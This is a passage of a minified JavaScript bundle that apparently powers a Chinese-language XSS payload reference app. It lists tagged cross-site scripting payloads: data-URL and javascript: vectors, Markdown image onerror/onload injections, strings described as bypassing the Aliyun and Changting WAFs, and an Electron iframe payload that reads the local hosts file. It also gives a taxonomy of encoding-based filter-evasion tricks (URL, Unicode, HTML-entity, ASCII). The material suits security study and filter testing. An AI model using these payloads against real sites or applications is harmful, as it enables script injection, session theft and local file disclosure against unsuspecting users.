</script>`,desc:[e.a.createElement("div",null,"\u4EE5\u4E0A3\u79CD\u65B9\u5F0F\uFF0C\u90FD\u662F\u53EF\u4EE5\u8FD0\u884C\u7684\u3002 ",Object(F.c)("\u826F\u597D\u7684\u4F8B\u8BC1\uFF01"),e.a.createElement("ol",null,e.a.createElement("li",null,"\u3010js\u89E6\u53D1html\u6E32\u67D3\u3011\u3001\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\u3001\u3010\u5757\u7EA7JS\u4EE3\u7801\u5185\u3011\uFF0C\u90FD\u662F\u53EF\u4EE5\u7684\u3002")))],tag:[a["Unicode \u4E07\u56FD\u7801"]]},{name:"  <script src='data:,print(1)'></script>  ",desc:["\u867D\u6CA1\u6709 base64\u7F16\u7801 \uFF0C\u4F46\u4ECD\u7136\u80FD\u591F\u6267\u884C\u3002"],tag:[a["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],a["<script>\u7684\u3010src\u3011"]]},{name:"<svg\fonload=print(1)>",desc:[e.a.createElement("div",null,a["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],"\u3011")],tag:[a["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],a.\u6362\u9875\u7B26,a["ASCII \u7F8E\u56FD\u7801"]]},{name:" <a href='javascript:print(1)'>123</a> ",desc:["\u6BD4\u8F83\u7279\u522B\u7684\u4E00\u70B9\u662F\uFF0C\u5E38\u5E38\u53EF\u4EE5\u652F\u6301\u3010MarkDown\u8BED\u6CD5\u3011\u3002"],tag:[a.\u8F83\u5E38\u89C4,a["<a>\u7684\u3010href\u3011"],a["<a>\u6807\u7B7E"]]},{name:" <iframe src='file://c:/windows/system32/drivers/etc/hosts' onload='alert(iframe.contentDocument.body.innerHTML)' id='iframe'> ",desc:["\u9002\u5408\u5728\u3010Electron\u5E94\u7528\u3011\u4E2D\uFF0CXSS\u7684\u573A\u666F\u3002\uFF08\u6709\u65F6\u80FD\u76F4\u63A5\u5524\u8D77\u672C\u5730\uFF09","\u4F46\u4E5F\u6709\u53EF\u80FD\u9047\u5230\u3010Not allowed to load local resource: <URL>\u3011\u7684\u9519\u8BEF\u3002","\u4FEE\u590D\u65E5\u671F\uFF1A2018\u5E749\u6708September\u3002"],tag:[a.\u5F88\u5947\u8469,a["<iframe>\u7684\u3010src\u3011"],a.\u57FA\u672CElectron\u8BED\u53E5]},{name:`/*iframe/src*/<iframe/src="<iframe/src=@"/onload=print(1) /*iframe/src*/><form id='document' name='body'><input name='innerHTML'><video src='https://www.w3cschool.cn/statics/demosource/mov_bbb.mp4' controls oncanplay=print(1)>`,desc:["1.\u66FE\u7ECF\u653B\u7834\u4E86\uFF0CElectron\u5E94\u7528\uFF0C\u3010Laverna\u3011\u7684\u3010XSS Filter\u3011\u3002\u662F\u975E\u5E38\u4E0D\u9519\u7684\u6210\u5C31\uFF01\uFF01\uFF01","2.\u4F7F\u7528\u4E86\u3010DOM\u963B\u585E\u5668\u3011 \uFF08\u4F46\u6B64\u5904\uFF0C\u4F3C\u4E4E\u5E76\u6CA1\u6709\u8D77\u5230\u4F5C\u7528\u3002\u5D4C\u5957\u8D77\u5230\u4E86\u4F5C\u7528\uFF09"],tag:[a.DOM\u963B\u585E\u5668,a["\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09"],a.\u57FA\u672CElectron\u8BED\u53E5,a["<iframe>\u7684\u3010src\u3011"],a["\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011"],a["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]]},{name:"[\u6587\u5B57](javascript:print(1))",desc:["\u7F51\u9875\u8DEF\u5F84\u94FE\u63A5"],tag:[a.MarkDown\u8D85\u94FE\u63A5]},{name:'![\u5934\u50CF]("onerror="print(1))',desc:["\u56FE\u7247\u94FE\u63A5","\u52A0\u8F7D\u5931\u8D25\u7684\u573A\u666F"],tag:[a.MarkDown\u8D85\u94FE\u63A5]},{name:`![\u5934\u50CF](https://www.w3schools.com/images/driveicon.png"onload="alert('XSS'))`,desc:["\u56FE\u7247\u94FE\u63A5","\u52A0\u8F7D\u6210\u529F\u7684\u573A\u666F"],tag:[a.MarkDown\u8D85\u94FE\u63A5]},{name:'![\u5934\u50CF" onload=alert(1);//](https://www.w3schools.com/images/driveicon.png)',desc:["\u56FE\u7247\u94FE\u63A5","\u52A0\u8F7D\u6210\u529F\u7684\u573A\u666F","\u8C03\u6362\u4E86\u8BED\u5E8F"],tag:[a.MarkDown\u8D85\u94FE\u63A5]},{name:"  <img src=# onerror=print`2`>  ",desc:[e.a.createElement(e.a.Fragment,null,"\u57FA\u672C\u53C2\u8003\u8D44\u6599\uFF1A",w("\u7ED5\u8FC7\u963F\u91CC\u4E91\u76FE\u8FDB\u884CXSS-\u963F\u91CC\u4E91\u5F00\u53D1\u8005\u793E\u533A","https://developer.aliyun.com/article/519334"))],tag:[a["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]},{name:'  ">--!><svg> <img src=# onerror=alert`2`>  ',desc:[e.a.createElement(e.a.Fragment,null,"\u662F\u4E0A\u8FF0\u7684\u589E\u5F3A\u7248\uFF01")],tag:[a["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]},{name:"site:a=<script>/**/alert(111)//",desc:[e.a.createElement(e.a.Fragment,null,"\u5728\u3010\u767E\u5EA6Baidu\u3011\u641C\u7D22\u5F15\u64CE\uFF0C\u76F4\u63A5\u8F93\u5165\u89E6\u53D1\u4E86\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF1F\uFF1F\uFF1F"),e.a.createElement(e.a.Fragment,null,e.a.createElement("a",{href:"https://www.baidu.com/s?wd=site%3Aa%3D%3Cscript%3E%2F**%2Falert%28%60%E6%88%91%E5%8F%AB%E5%9C%9F%E8%B1%86%E8%B1%86%2C%E6%88%91%E4%BB%8A%E5%B9%B4%E4%B8%89%E5%B2%81%E4%BA%86%60%29%2F%2F",target:"_blank",rel:"noreferrer"},"\u70B9\u51FB\u793A\u8303")),e.a.createElement(e.a.Fragment,null,"\u7C7B\u4F3C\u7684\u8FD8\u6709 ",e.a.createElement("pre",null,"site:a=<script>/**/alert(`\u6211\u53EB\u571F\u8C46\u8C46\uFF0C\u4ECA\u5E74\u4E09\u5C81\u4E86`)//"))],tag:[a["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]}],y.options=[Object(E.a)(Object(E.a)({},Object(F.a)(a.\u6309\u9636\u6BB5)),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a["1.\u6295\u77F3\u95EE\u8DEF\uFF0C\u4ED9\u4EBA\u6307\u8DEF"])),{},{children:[Object(E.a)({},Object(F.a)(a.\u5168\u77E5\u5168\u80FD\u5168\u5584)),Object(E.a)({},Object(F.a)(a.\u7231\u56FD\u9752\u5E74)),Object(E.a)({},Object(F.a)(a["123<br>321"],[Object(F.c)("\u76F8\u5BF9\u800C\u8A00\uFF0C\u6BD4<img>\u66F4\u52A0\u9690\u853D\u4E00\u70B9")]))]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"])),{},{children:[]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["3.\u66F4\u52A0\u5BBD\u6CDB\u7684\u89E3\u6CD5"])),{},{children:[Object(E.a)({},Object(F.a)(a["\u4E8C\u5206\u67E5\u627E\u6CD5 \uFF0C\u6765\u5B9A\u4F4D\u3010\u654F\u611F\u8BCD\u6C47\u3011"]))]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["4.\u7528\u3010\u62BD\u67E5\u3011\u5F62\u5F0F\uFF0C\u9010\u4E2A\u6392\u9664"])),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.html\u4E8B\u4EF6)),{},{children:[Object(E.a)({},Object(F.a)(a.\u6F0F\u6389\u7684\u4E8B\u4EF6)),Object(F.d)(a["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"],a.HTML5)]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["\u3010src\u3011(\u5305\u62EChref)"],["src\u7684\u5F15\u7528\u8D44\u6E90\u7684\uFF0C\u4E00\u822C\u4E0D\u4F1A\u5C4F\u853D\u6389\u3002\u2014\u2014\u2014\u2014WAF",e.a.createElement("div",null,"\u4E00\u822C\u5229\u7528\u65B9\u5F0F\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 javascript\u534F\u8BAE"),e.a.createElement("li",null,"\u2461 DataUrl\u534F\u8BAE"),e.a.createElement("li",null,"\u2462 \u5185\u5D4C\uFF1A\u5176\u5B83\u6807\u7B7E")))])),{},{children:[Object(E.a)({},Object(F.a)(a["<img>\u7684\u3010src\u3011"])),Object(E.a)({},Object(F.a)(a["<iframe>\u7684\u3010src\u3011"])),Object(E.a)({},Object(F.a)(a["<iframe>\u7684\u3010srcdoc\u3011"])),Object(E.a)({},Object(F.a)(a["<embed>\u7684\u3010src\u3011"])),Object(E.a)({},Object(F.a)(a["<a>\u7684\u3010href\u3011"])),Object(E.a)({},Object(F.a)(a["<script>\u7684\u3010src\u3011"],[e.a.createElement("div",null,Object(F.c)("\u8FD9\u4E2A\uFF0C\u4F7F\u7528\u7684\u6BD4\u8F83\u5C11"))]))]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["\u57FA\u4E8E\u3010src\u3011\u7684\uFF0C\u66F4\u9AD8\u9636\u7528\u6CD5"])),{},{children:[Object(E.a)({},Object(F.a)(a["\u591A\u5C42\u5D4C\u5957\u3010src\u3011\uFF0C\u3010\u7236src\u3011\u91CC\u9762\u518D\u5D4C\u5957\u3010\u5B50src\u3011"]))]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["5.\u6839\u636E\u7ECF\u9A8C\uFF0C\u4E00\u4E9B\u6613\u7A81\u7834\u7684\u8584\u5F31\u70B9"])),{},{children:[Object(E.a)({},Object(F.a)(a["<a>\u6807\u7B7E"],["\u7ECF\u8FC7\u8001\u5E08\u7684\u7ECF\u9A8C\uFF0C\u8BD5\u8FC7\u5F88\u591A\u7F51\u7AD9\uFF0C\u3010<a>\u3011\u6807\u7B7E\u7ED5\u8FC7\u7684\u6982\u7387\uFF0C\u90FD\u662F\u5F88\u5927\u7684\u3002"]))]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u6309\u573A\u666F)),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.\u7EAFHTML\u5185,[e.a.createElement("div",null,B.\u6982\u5FF5,e.a.createElement("ol",null,e.a.createElement("li",null,"\u3010\u6807\u7B7E\u540D\u3011\uFF1A\u6807\u7B7E\u7684\u540D\u5B57"),e.a.createElement("li",null,"\u3010\u95ED\u5408\u3011\uFF1A\u4E24\u4FA7\u7684\u5C16\u62EC\u53F7"),e.a.createElement("li",null,"\u3010innerHTML\u3011\uFF1A\u5C5E\u6027\u540D"),e.a.createElement("li",null,"\u3010attribute\u503C\u3011\uFF1A\u5C5E\u6027\u503C")))])),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.\u5E38\u7528\u8BED\u53E5)),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.\u9AD8\u53EF\u9760)),{},{children:[Object(E.a)(Object(E.a)({},Object(F.a)(a.\u8F83\u5E38\u89C4)),{},{children:[]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u5F88\u5947\u8469)),{},{children:[]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u4E2D\u53EF\u9760)),{},{children:[]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u4F4E\u53EF\u9760)),{},{children:[]})]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.bypass\u7ED5\u8FC7)),{},{children:[Object(E.a)({},Object(F.a)(a.\u5927\u5C0F\u5199\u654F\u611F,[e.a.createElement("div",null,"\u867D\u7136\u6BD4\u8F83\u3010\u57FA\u7840\u3011\uFF0C\u5F80\u5F80\u5E38\u89C1\u800C\u6709\u7528\u3002")])),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u5BF9\u7F16\u7801\u654F\u611F\u7684\u7B26\u53F7,[e.a.createElement("div",null,"\u8F93\u5165\u65B9\u5F0F\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 \u53EF\u4EE5\u901A\u8FC7\u3010IDE\u3011\u8F93\u5165\u540E\uFF0C\u518D\u590D\u5236\u7C98\u8D34\u8FC7\u53BB ",Object(F.c)("\u5982 \u3010\\f\u3011 \u2014 \u3010\f\u3011"))))])),{},{children:[Object(E.a)({},Object(F.a)(a[":"],["\u3010\u5192\u53F7\u3011",": %3A"])),Object(E.a)({},Object(F.a)(a[";"],["\u3010\u5206\u53F7\u3011","%3B"])),Object(E.a)({},Object(F.a)(a[","],["\u3010\u9017\u53F7\u3011","%2C"])),Object(E.a)({},Object(F.a)(a["()"],["\u3010\u5C0F\u62EC\u53F7\u3011","( %28",") %29"])),Object(E.a)({},Object(F.a)(a["'"],["\u3010\u5355\u5F15\u53F7\u3011","' %27"])),Object(E.a)({},Object(F.a)(a['"'],["\u3010\u53CC\u5F15\u53F7\u3011",'" %22'])),Object(E.a)({},Object(F.a)(a["`"],["\u3010\u53CD\u5F15\u53F7\u3011","%60"])),Object(E.a)({},Object(F.a)(a["."],["\u3010\u70B9\u53F7\u3011","%2e"])),Object(E.a)({},Object(F.a)(a["<>"],["\u3010\u5C16\u62EC\u53F7\u3011 \u3010\u5C0F\u4E8E\u53F7\u3001\u5927\u4E8E\u53F7\u3011","< %3C","> %3E","\u3010\u6807\u7B7E\u95ED\u5408\u3011","\u6709\u65F6\u5019\uFF0C\u53EAbypass\u5DE6\u8FB9\u7684\uFF1B\u6709\u65F6\u5019\uFF0C\u53EAbypass\u53F3\u8FB9\u7684\u3002"])),Object(E.a)({},Object(F.a)(a["="],["\u3010\u7B49\u4E8E\u53F7\u3011","%3D"])),Object(E.a)(Object(E.a)({},Object(F.a)(a["/"],["\u3010\u659C\u6760\u3011","%2F",e.a.createElement("div",null,B["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u7279\u6B8A\u7528\u9014\uFF1A\u5728",a.\u7EAFHTML\u5185,"\u5185\uFF0C\u4EE3\u66FF\u3010\u7A7A\u683C\u3011\uFF0C\u5206\u9694",a.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027,"\u3010\u540D\u5B57\u3011 ",Object(F.c)("\u5C5E\u4E8E\u5229\u7528\uFF0C\u6765\u7ED5\u8FC7\u5176\u5B83"))))])),{},{children:[Object(E.a)({},Object(F.a)(a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]))]}),Object(F.d)(a.\u5B57\u7B26\u4E32\u53D8\u91CF,a.\u5757\u7EA7JS\u4EE3\u7801\u5185)]}),Object(E.a)(Object(E.a)({},Object(F.a)(a.\u7F16\u7801\u65B9\u5F0F)),{},{children:[Object(E.a)({},Object(F.a)(a.\u5BBD\u5B57\u8282,[e.a.createElement("div",null,"\u652F\u6301\u7684\u5B57\u7B26\u96C6",e.a.createElement("ol",null,F.e.map(function(s){return e.a.createElement("li",null,s)})))])),Object(E.a)({},Object(F.a)(a["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"],[e.a.createElement("div",null,B["\u539F\u7406\u573A\u666F\uFF1A"]),e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 \u3010\u6B63\u5219\u53CC\u53CD\u659C\u6760\u3011+\u3010\u5D4C\u5165\u5B57\u7B26\u4E32\u3011+\u3010\u4F20\u9012\u7ED9\u6D4F\u89C8\u5668\uFF0Chtml\u89E3\u6790\u3011"),e.a.createElement("li",null,"\u2461 \u3010\u6B63\u5219\u53CC\u53CD\u659C\u6760\u3011+\u3010\u5D4C\u5165\u5B57\u7B26\u4E32\u3011+\u3010\u4F20\u9012\u7ED9\u6D4F\u89C8\u5668\uFF0Chtml\u89E3\u6790\u3011+\u3010",B["\u3010script block js\u3011"],"\u91CC\u53C8\u6709\u5B57\u7B26\u4E32\uFF0C\u8F6C\u4E49\u3011"))])),Object(E.a)(Object(E.a)({},Object(F.a)(a.UrlEncode\u8DEF\u5F84\u7F16\u7801,[e.a.createElement("div",null,B["\u539F\u7406\u573A\u666F\uFF1A"]),e.a.createElement("ol",null,e.a.createElement("li",null,"\u5927\u90E8\u5206\u60C5\u51B5\u4E0B\uFF0C\u90FD\u662F\u3010\u88AB\u8F6C\u5316\u8FD8\u539F\u3011\u540E\uFF0C\u624D\u53D1\u6325\u4F5C\u7528 ",Object(F.c)("\u672C\u8EAB\u65E0\u4F5C\u7528\uFF0C\u88AB\u8F6C\u5316\u540E\u624D\u8D77\u4F5C\u7528")),e.a.createElement("li",null,"\u5728\u4EE5\u4E0B\u573A\u5408\uFF0C\u7279\u522B\u6709\u7528",e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 ",B["Url\u5730\u5740\u680F\uFF0C\u624B\u52A8\u8F93\u5165"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u5355\u884C\u6587\u672C"),e.a.createElement("li",null,"\u591A\u884C\u6587\u672C ",Object(F.c)("%0A\u7684\u6362\u884C\u7B26\uFF0C\u5F80\u5F80\u662F\u4E00\u4E2A\u975E\u5E38\u6709\u7528\u7684\u6280\u5DE7")))),e.a.createElement("li",null,"\u2461 ",B["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"],Object(F.c)("\uFF08\u800C\u4E14\u8981\u975E\u5E38\u7D27\u51D1\uFF01\u4E0D\u80FD\u7559\u5E38\u89C4\u7A7A\u683C\uFF09"),Object(F.c)("\u5176\u5B9E\uFF0C\u672C\u8D28\u4E0A\u5C31\u662F".concat(B["\u3010html inline js\u3011"],"\u7684\u6267\u884C")),e.a.createElement("ol",null,e.a.createElement("li",null,'\u3010location\u8DF3\u8F6C\u3011location="javascript:print%281%29" ',Object(F.c)("\u6B64\u5904\u4E0D\u80FD\u95F4\u9694\u7A7A\u683C"))))))),e.a.createElement("div",null,B["\u65E0\u6548\u573A\u5408\uFF1A"]," ",Object(F.c)("\u6CE8\u610F\uFF0C\u662F\u65E0\u6548\uFF01"),e.a.createElement("ol",null,e.a.createElement("li",null,B["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"]," ",Object(F.c)("\u8FD9\u70B9\uFF0C\u662F\u8D85\u4E4E\u4E00\u822C\u7684\u60F3\u8C61\u7684\u3002\u786E\u5B9E\u4E0D\u53EF\u4EE5"),e.a.createElement("ol",null,e.a.createElement("li",null,e.a.createElement("div",null,'location="https%3A%2F%2Fwww.segmentfault.com%40127.0.0.1%3A20443%2Ftest.js"'),e.a.createElement("div",null,Object(F.c)("\u5FC5\u987B\u5148\u7528\u3010decodeURIComponent\u3011\uFF0C\u624D\u80FD\u6709\u6548"))))),e.a.createElement("li",null,B["\u3010src\u3011\u5C5E\u6027"]," ",Object(F.c)("\u8FD9\u4E2A\u4E0D\u884C\u3002\u6BD4\u5176\u5B83\u7F16\u7801\uFF0C\u8981\u5F31\u4E00\u70B9"))))])),{},{children:[]}),Object(E.a)(Object(E.a)({},Object(F.a)(a["Unicode \u4E07\u56FD\u7801"],[e.a.createElement("div",null,"\u5206\u4E3A4\u79CD\u5F62\u5F0F\uFF1A",e.a.createElement("ol",{style:{fontSize:"2rem",lineHeight:"2rem"}},e.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011U+000\u2460\u2460",e.a.createElement("ol",null,e.a.createElement("li",null,Object(F.c)("\u6682\u65F6\u672A\u77E5",{fontSize:"1rem"})))),e.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011&#x\u2460\u2460;",e.a.createElement("ol",null,e.a.createElement("li",null,Object(F.c)("\u3010\u5F00\u5934\u7B26\u3011\u4E4B\u540E\uFF0C\u53EF\u4EE5\u63A5\u3010\u65E0\u9650\u591A\u4E2A0\u3011",{fontSize:"1rem"})))),e.a.createElement("li",null,"\u3010\u5341\u8FDB\u5236\u3011&#\u2460\u2460;",e.a.createElement("ol",null,e.a.createElement("li",null,Object(F.c)("\u3010\u5F00\u5934\u7B26\u3011\u4E4B\u540E\uFF0C\u53EF\u4EE5\u63A5\u3010\u65E0\u9650\u591A\u4E2A0\u3011",{fontSize:"1rem"})))),e.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011\\u00\u2460\u2460",e.a.createElement("ol",null,e.a.createElement("li",null,Object(F.c)("\u4E0D\u80FD\u52A0\u30100\u3011",{fontSize:"1rem"})),e.a.createElement("li",null,Object(F.c)("\u6570\u5B57\u90E8\u5206\uFF0C\u4E00\u5B9A\u662F\u30104\u4F4D\u3011\uFF1B\u524D\u97622\u4F4D\uFF0C\u7ECF\u5E38\u662F\u301000\u3011",{fontSize:"1rem"})),e.a.createElement("li",null,Object(F.c)("\u5B57\u6BCDu\uFF0C\u5BF9\u3010\u5927\u5C0F\u5199\u3011\u654F\u611F\uFF1B\u4E00\u5B9A\u8981\u662F\u3010\u5C0F\u5199\u3011",{fontSize:"1rem"})))),e.a.createElement("li",null,"\u3010\u5341\u516D\u8FDB\u5236\u3011","\\u{\u2460\u2460}",e.a.createElement("ol",null,e.a.createElement("li",null,Object(F.c)("\u3010\u5F00\u5934\u7B26|\u82B1\u62EC\u53F7\u3011\u4E4B\u540E\uFF0C\u53EF\u4EE5\u63A5\u3010\u65E0\u9650\u591A\u4E2A0\u3011",{fontSize:"1rem"}))))),B["\u539F\u7406\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u3010js\u89E3\u6790\u5668\u3011\u5728\u5DE5\u4F5C\u65F6\u4F1A\u5BF9\u3010unicode\u3011\u5148\u8FDB\u884C\u3010\u89E3\u7801\u3011\u3002")),B["\u539F\u7406\u573A\u666F\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 ",B["\u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS"]," "),e.a.createElement("li",null,"\u2461 ",B["\u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS"]," "),e.a.createElement("li",null,"\u2462 ",B["\u3010src\u3011\u5C5E\u6027"]," ",Object(F.c)("\u6B64\u5904\uFF0C\u3010\u5B57\u7B26\u4E32\u3011\u5FC5\u987B\u7531\u3010\u4EFB\u4F55\u4E00\u5BF9\u5F15\u53F7\u3011\u5305\u88F9")),e.a.createElement("li",null,"\u2463 \u3010",a.\u5757\u7EA7JS\u4EE3\u7801\u5185,"\u3011\uFF1A ",Object(F.c)("\u4E00\u5C11\u90E8\u5206(\u4E0B\u97622\u4E2A)\uFF0C\u652F\u6301"),e.a.createElement("ol",null,e.a.createElement("li",null,"\\u{\u2460\u2460}"," ",Object(F.c)("\u5F88\u795E\u5947\uFF0C\u5F88\u6709\u7528")),e.a.createElement("li",null,"\\u00\u2460\u2460 ",Object(F.c)("\u5F88\u795E\u5947\uFF0C\u5F88\u6709\u7528")))),e.a.createElement("li",null,"\u2464 \u3010",B["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"],"\u3011\uFF1A ",Object(F.c)("\u5927\u90E8\u5206(\u4E0B\u97623\u4E2A)\uFF0C\u652F\u6301"),e.a.createElement("ol",null,e.a.createElement("li",null,"&#x\u2460\u2460; \u6709\u6548"),e.a.createElement("li",null,"&#\u2460\u2460; \u6709\u6548"),e.a.createElement("li",null,"\\u{\u2460\u2460}"," \u6709\u6548"),e.a.createElement("li",null,"\\u00\u2460\u2460 \u65E0\u6548\uFF1B\u800C\u4E14\u540E\u9762\u6CA1\u6709\u3010\u5206\u9694\u7B26\u3011 ",Object(F.c)("\u65E0\u6548\u7684\u4E00\u4E2A"))))),B["\u65E0\u6548\u573A\u5408\uFF1A"],Object(F.c)("\u6CE8\u610F\uFF0C\u662F\u65E0\u6548\uFF01"),e.a.createElement("ol",null,e.a.createElement("li",null,B["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"])),B["\u4F18\u70B9\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 \u5305\u542B\u4E86\u3010\u82F1\u6587\u5B57\u6BCD\u3011")))])),{},{children:[]}),Object(E.a)({},Object(F.a)(a.HTML\u5B9E\u4F53\u5316\u7F16\u7801,[e.a.createElement("div",null,"\u53EA\u67091\u79CD\u5F62\u5F0F\uFF1A",e.a.createElement("ol",{style:{fontSize:"2rem",lineHeight:"2rem"}},e.a.createElement("li",null,"\u3010\u5B57\u6BCD\u3011","&","\u5355\u8BCD\u7F29\u5199;")),B["\u539F\u7406\u573A\u666F\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 \u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS"),e.a.createElement("li",null,"\u2461 \u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS"),e.a.createElement("li",null,"\u2462 ",B["\u3010src\u3011\u5C5E\u6027"]," ",Object(F.c)("\u6B64\u5904\uFF0C\u3010\u5B57\u7B26\u4E32\u3011\u5FC5\u987B\u7531\u3010\u4EFB\u4F55\u4E00\u5BF9\u5F15\u53F7\u3011\u5305\u88F9")),e.a.createElement("li",null,"\u2463 \u65E0"),e.a.createElement("li",null,"\u2464 ",B["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u6240\u6709\u7684")))),B["\u65E0\u6548\u573A\u5408\uFF1A"],Object(F.c)("\u6CE8\u610F\uFF0C\u662F\u65E0\u6548\uFF01"),e.a.createElement("ol",null,e.a.createElement("li",null,B["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"]),e.a.createElement("li",null,a.\u5757\u7EA7JS\u4EE3\u7801\u5185)),B["\u7F3A\u70B9\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 \u5E76\u4E0D\u80FD\u5305\u542B \u5E38\u89C4\u7684\u3010\u82F1\u6587\u5B57\u6BCD\u3011\uFF1B")),B["\u4F18\u70B9\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u62E5\u6709\u3010\u5F88\u5947\u602A\u3011\u7684\u8986\u76D6\u9762\uFF1B\u8FD9\u610F\u5473\u7740 WAF \u66F4\u96BE\u8003\u8651\u5468\u5168\u3002",Object(F.c)("\u6BD4\u5982\uFF0C\u67D0\u4E9B\u51B7\u95E8\u8BED\u8A00\u7684\u5B57\u6BCD\uFF0C\u5B83\u53C8\u504F\u504F\u5305\u542B"))))])),Object(E.a)({},Object(F.a)(a["ASCII \u7F8E\u56FD\u7801"],[e.a.createElement("div",null,"ASCII \u7F8E\u56FD\u4FE1\u606F\u4EA4\u6362\u6807\u51C6\u4EE3\u7801"),e.a.createElement("div",null,Object(F.c)("\u53EF\u4EE5\u7528\u4E8E\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\uFF0C\u8FD9\u662F\u8BA9\u6211\u5F88\u60CA\u5947\u7684\uFF01")),e.a.createElement("div",null,"\u5206\u4E3A1\u79CD\u5F62\u5F0F\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"\u3010\u4E24\u4F4D\u3011 \\x\u2460\u2460 \u3010\u4E09\u4F4D\u3011 \\x\u2460\u2460\u2460 ",Object(F.c)("\u5C0F\u96C6\uFF0C\u4ECE0\u5230127\uFF1B\u5927\u96C6\uFF0C\u4ECE0\u5230255")))),e.a.createElement("div",null,B["\u539F\u7406\u573A\u666F\uFF1A"],e.a.createElement("ol",null,e.a.createElement("li",null,"\u4E00\u822C\u7528\u4E8E JS\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\u3002 ",Object(F.c)("\u89E3\u51B3\u4E86\u4E4B\u524D\u5934\u75BC\u7684\u4E00\u4E2A\u95EE\u9898\uFF1B\u586B\u8865\u4E86\u7A7A\u767D\u3002"))))])),Object(E.a)(Object(E.a)({},Object(F.a)(a["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],[e.a.createElement("div",null,"\u5206\u4E3A2\u79CD\u5F62\u5F0F\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"\u2460 data:,\u3010JS\u8BED\u53E5\u6267\u884C\u3011"),e.a.createElement("li",null,"\u2461 